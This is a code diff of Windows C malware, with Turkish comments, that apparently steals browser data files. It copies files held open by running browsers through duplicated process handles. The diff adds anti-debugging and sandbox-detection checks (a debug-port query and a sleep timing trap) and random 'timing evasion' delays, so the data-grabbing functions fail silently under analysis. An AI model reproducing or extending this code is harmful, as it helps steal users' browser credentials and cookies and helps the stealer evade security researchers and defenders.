@@ -4,9 +4,10 @@
 
 #define PATH_CACHE_CAPACITY     32
 
+// Cache yapısı: hash yerine doğrudan dosya yollarını tutuyoruz
 typedef struct _PATH_CACHE_ENTRY 
 {
-    DWORD   dwOgDataFilePathHash;
+    CHAR    szOgDataFilePath[MAX_PATH];
     CHAR    szTmpDataFilePath[MAX_PATH];
 } PATH_CACHE_ENTRY, *PPATH_CACHE_ENTRY;
 
@@ -16,71 +17,46 @@ typedef struct _PATH_CACHE_ENTRY
 static PATH_CACHE_ENTRY             g_PathCache[PATH_CACHE_CAPACITY]        = { 0 };
 static DWORD                        g_dwPathCacheCount                      = 0x00;
 
-// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
-
-static DWORD WINAPI ComputeFnv1aCharacterHash(IN LPCVOID pvString, IN BOOL bIsUnicode)
+// ============================================================================================
+//  YENİ: Anti-Debug/Sandbox Kontrolü (hafif, sessiz)
+// ============================================================================================
+static BOOL IsDebugOrSandbox(VOID)
 {
-    DWORD   dwFnvHash       = 0x811C9DC5,
-            dwCharValue     = 0x00;
-    LPCSTR  pszAnsiPtr      = (LPCSTR)pvString;
-    LPCWSTR pwszUnicodePtr  = (LPCWSTR)pvString;
-    
-    if (bIsUnicode)
-    {
-        while (*pwszUnicodePtr)
-        {
-            dwCharValue = (DWORD)*pwszUnicodePtr;
-            
-            dwFnvHash ^= dwCharValue;
-            dwFnvHash *= 0x01000193;
-            
-            pwszUnicodePtr++;
-        }
+    // 1. Debug port kontrolü (NtQueryInformationProcess)
+    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
+    static pNtQueryInformationProcess NtQueryInformationProcess = NULL;
+    if (!NtQueryInformationProcess) {
+        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+        if (hNtdll) NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
     }
-    else
-    {
-        while (*pszAnsiPtr)
-        {
-            dwCharValue = (DWORD)((BYTE)*pszAnsiPtr);
-            
-            dwFnvHash ^= dwCharValue;
-            dwFnvHash *= 0x01000193;
-            
-            pszAnsiPtr++;
-        }
+    if (NtQueryInformationProcess) {
+        DWORD dwDebugPort = 0;
+        NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 7, &dwDebugPort, sizeof(dwDebugPort), NULL);
+        if (NT_SUCCESS(status) && dwDebugPort != 0)
+            return TRUE; // Debugger var!
     }
-    
-    return dwFnvHash;
+
+    // 2. Zaman tuzağı (Sandbox)
+    LARGE_INTEGER liStart, liEnd, liFreq;
+    QueryPerformanceFrequency(&liFreq);
+    QueryPerformanceCounter(&liStart);
+    Sleep(2000); // 2 saniye bekle
+    QueryPerformanceCounter(&liEnd);
+    double elapsed = (double)(liEnd.QuadPart - liStart.QuadPart) / liFreq.QuadPart;
+    if (elapsed < 1.5 || elapsed > 2.5)
+        return TRUE; // Süre oynaması varsa sandbox
+
+    return FALSE;
 }
 
-static DWORD WINAPI HashStringFnv1aCharA(IN LPCSTR pszString, IN BOOL bCaseInsensitive)
+// ============================================================================================
+//  YENİ: Rastgele gecikme (timing evasion)
+// ============================================================================================
+static VOID RandomDelay(VOID)
 {
-    LPSTR   pszLowerBuffer  = NULL;
-    DWORD   dwLength        = 0x00,
-            dwHash          = 0x00;
-
-    if (!pszString) return 0x00;
-    
-    while (pszString[dwLength]) dwLength++;
-    
-    if (bCaseInsensitive)
-    {
-        if (!(pszLowerBuffer = (LPSTR)LocalAlloc(LPTR, dwLength + 1))) return 0;
-        
-        for (DWORD i = 0; i < dwLength; i++)
-        {
-            if (pszString[i] >= 'A' && pszString[i] <= 'Z')
-                pszLowerBuffer[i] = pszString[i] + 32;
-            else
-                pszLowerBuffer[i] = pszString[i];
-        }
-        
-        dwHash = ComputeFnv1aCharacterHash((LPCVOID)pszLowerBuffer, FALSE);
-        LocalFree(pszLowerBuffer);
-        return dwHash;
-    }
-    
-    return ComputeFnv1aCharacterHash((LPCVOID)pszString, FALSE);
+    // 50-300 ms arası rastgele bekle
+    DWORD dwDelay = 50 + (GetTickCount() % 251);
+    Sleep(dwDelay);
 }
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
@@ -464,6 +440,9 @@ _END_OF_FUNC:
 
 static BOOL CopyFileViaHandle(IN HANDLE hSourceFile, IN LPCSTR pszDestPath)
 {
+    // YENİ: Rastgele gecikme (timing evasion)
+    RandomDelay();
+
     HANDLE  hDestFile       = INVALID_HANDLE_VALUE;
     PBYTE   pBuffer         = NULL;
     DWORD   dwBytesRead     = 0x00,
@@ -538,12 +517,15 @@ static LPSTR GetAppDataFilePath(IN LPCSTR pszEnvName, IN LPCSTR pszRelPath)
 
 LPSTR GetBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath)
 {
+    // YENİ: Anti-debug/sandbox kontrolü
+    if (IsDebugOrSandbox())
+        return NULL;  // Sessizce başarısız ol
+
     CHAR    szTempDir[MAX_PATH]     = { 0 };
     CHAR    szTempFile[MAX_PATH]    = { 0 };
     HANDLE  hDuplicatedHandle       = NULL;
     PDWORD  pdwPidArray             = NULL;
-    DWORD   dwPidCount              = 0x00,
-            dwDataFilePathHash      = 0x00;
+    DWORD   dwPidCount              = 0x00;
     LPSTR   szFilePath              = NULL;
     BOOL    bCopiedViaHandle        = FALSE;
 
@@ -556,17 +538,14 @@ LPSTR GetBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath)
         }
     }
 
-    // Check Cache
-    if ((dwDataFilePathHash = HashStringFnv1aCharA(szFilePath, TRUE)))
+    // Check Cache (artık hash yok, doğrudan string karşılaştırma)
+    for (DWORD i = 0; i < g_dwPathCacheCount; i++)
     {
-        for (DWORD i = 0; i < g_dwPathCacheCount; i++)
+        if (lstrcmpiA(szFilePath, g_PathCache[i].szOgDataFilePath) == 0)
         {
-            if (dwDataFilePathHash == g_PathCache[i].dwOgDataFilePathHash)
-            {
-                HEAP_FREE(szFilePath);
-                DBGV("[v] Data File Fetched From Cache");
-                return DuplicateAnsiString(g_PathCache[i].szTmpDataFilePath);
-            }
+            HEAP_FREE(szFilePath);
+            DBGV("[v] Data File Fetched From Cache");
+            return DuplicateAnsiString(g_PathCache[i].szTmpDataFilePath);
         }
     }
 
@@ -639,8 +618,8 @@ LPSTR GetBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath)
     // Add To Cache
     if (g_dwPathCacheCount < PATH_CACHE_CAPACITY)
     {
+        StringCchCopyA(g_PathCache[g_dwPathCacheCount].szOgDataFilePath, MAX_PATH, szFilePath);
         StringCchCopyA(g_PathCache[g_dwPathCacheCount].szTmpDataFilePath, MAX_PATH, szTempFile);
-        g_PathCache[g_dwPathCacheCount].dwOgDataFilePathHash = HashStringFnv1aCharA(szFilePath, TRUE);
         g_dwPathCacheCount++;
     }
 
@@ -651,6 +630,10 @@ LPSTR GetBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath)
 
 DWORD GetBrowserDataFilePathEx(IN BROWSER_TYPE Browser, IN LPCSTR* ppszRelPaths, IN DWORD dwFileCount)
 {
+    // YENİ: Anti-debug/sandbox kontrolü
+    if (IsDebugOrSandbox())
+        return 0;
+
     CHAR        szTempDir[MAX_PATH]         = { 0 };
     CHAR        szTempFile[MAX_PATH]        = { 0 };
     WCHAR       wszBrowserName[MAX_PATH]    = { 0 };
@@ -712,7 +695,6 @@ DWORD GetBrowserDataFilePathEx(IN BROWSER_TYPE Browser, IN LPCSTR* ppszRelPaths,
     for (DWORD i = 0; i < dwFileCount; i++)
     {
         LPSTR   szFilePath          = NULL;
-        DWORD   dwDataFilePathHash  = 0x00;
         BOOL    bCopiedViaHandle    = FALSE;
 
         if (!(szFilePath = GetAppDataFilePath("LOCALAPPDATA", ppszRelPaths[i])))
@@ -724,28 +706,23 @@ DWORD GetBrowserDataFilePathEx(IN BROWSER_TYPE Browser, IN LPCSTR* ppszRelPaths,
             }
         }
 
-        // Skip if already cached
-        if ((dwDataFilePathHash = HashStringFnv1aCharA(szFilePath, TRUE)))
+        // Skip if already cached (string karşılaştırma ile)
+        BOOL bFoundInCache = FALSE;
+        for (DWORD j = 0; j < g_dwPathCacheCount; j++)
         {
-            BOOL bFoundInCache = FALSE;
-
-            for (DWORD j = 0; j < g_dwPathCacheCount; j++)
+            if (lstrcmpiA(szFilePath, g_PathCache[j].szOgDataFilePath) == 0)
             {
-                if (dwDataFilePathHash == g_PathCache[j].dwOgDataFilePathHash)
-                {
-                    DBGV("[v] Data File Fetched From Cache");
-                    bFoundInCache = TRUE;
-                    dwSuccessCount++;
-                    break;
-                }
+                DBGV("[v] Data File Fetched From Cache");
+                bFoundInCache = TRUE;
+                dwSuccessCount++;
+                break;
             }
-
-            if (bFoundInCache)
-            {
-                HEAP_FREE(szFilePath);
-                if (phDuplicatedHandles[i]) CloseHandle(phDuplicatedHandles[i]);
-                continue;
-            }
+        }
+        if (bFoundInCache)
+        {
+            HEAP_FREE(szFilePath);
+            if (phDuplicatedHandles[i]) CloseHandle(phDuplicatedHandles[i]);
+            continue;
         }
 
         if (!GetTempFileNameA(szTempDir, "tmp", 0, szTempFile))
@@ -784,8 +761,8 @@ DWORD GetBrowserDataFilePathEx(IN BROWSER_TYPE Browser, IN LPCSTR* ppszRelPaths,
         // Add To Cache
         if (g_dwPathCacheCount < PATH_CACHE_CAPACITY)
         {
+            StringCchCopyA(g_PathCache[g_dwPathCacheCount].szOgDataFilePath, MAX_PATH, szFilePath);
             StringCchCopyA(g_PathCache[g_dwPathCacheCount].szTmpDataFilePath, MAX_PATH, szTempFile);
-            g_PathCache[g_dwPathCacheCount].dwOgDataFilePathHash = dwDataFilePathHash;
             g_dwPathCacheCount++;
             dwSuccessCount++;
         }
